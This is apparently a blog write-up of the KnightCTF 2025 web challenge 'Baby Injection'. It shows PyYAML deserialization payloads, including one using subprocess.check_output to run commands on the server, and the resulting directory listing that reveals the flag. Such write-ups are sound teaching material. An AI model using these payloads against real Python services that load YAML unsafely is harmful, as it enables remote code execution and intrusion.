---
title: "Baby Injection"
description: "Sometimes, seemingly harmless configuration files can do more than they appear. Can you uncover a hidden flaw and turn it to your advantage?"
pubDate: 2025-01-22
ctf: "KnightCTF 2025"
category: "web"
author: "sealldev"
section: "CTFs"
image: "images/25-knight/icon.png"
---



We are given a webserver which displays some text and has a base64 string at the end:
`http://172.105.121.246:5990/eWFt...`

Decoding that string we see the following:

```
yaml: <text here>
```

This seems to be some sort of YAML injection, so let's look at what the server is running with.

The webserver is running with **Python** according to the headers in the response (no screenshot sorry, it was very clear I promise).

Looking at PayloadAllTheThings there is a section on [PyYAML](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Insecure%20Deserialization/Python.md#pyyaml).

I try a basic payload: `!!python/object/apply:builtins.range [1, 10, 1]`.

The server response is `range(1,10)`, perfect!!

I try an RCE to list the files in the current directory: `yaml: !!python/object/new:subprocess.check_output [['ls', '-la']]`.

The webserver responds with the following (thanks to `abl` for supplying the response post CTF):

```
[{&#39;test&#39;: {b&#34;total 32\ndrwxr-xr-x 1 root root 4096 Jan 21 01:22 .\ndrwxr-xr-x 1 root root 4096 Jan 20 21:15 ..\n-rw-r--r-- 1 root root  500 Jan 20 21:08 Dockerfile\n-rw-r--r-- 1 root root    0 Jan 20 22:56 KCTF{d38787fb0741bd0efdad8ed01f037740}\n-rw-r--r-- 1 root root    0 Jan 20 22:56 Why didn&#39;t they set this as read only\n-rw-r--r-- 1 root root    0 Jan 20 22:56 a\n-rw-r--r-- 1 root root   86 Jan 20 22:43 a.txt\ndrwxr-xr-x 3 root root 4096 Jan 20 21:13 app\n-rw-r--r-- 1 root root    0 Jan 21 00:34 hey.txt\n-rw-r--r-- 1 root root   27 Jan 20 20:59 requirements.txt\n-rwxr-xr-x 1 root root  128 Jan 20 21:15 start.sh\ndrwxr-xr-x 2 root root 4096 Jan 21 01:23 static\n-rw-r--r-- 1 root root    0 Jan 20 22:56 what if someone overwrite the flag??\n-rw-r--r-- 1 root root    0 Jan 20 23:04 zab.txt\n&#34;: None}}]
```

This contains the flag!

Flag: `KCTF{d38787fb0741bd0efdad8ed01f037740}`
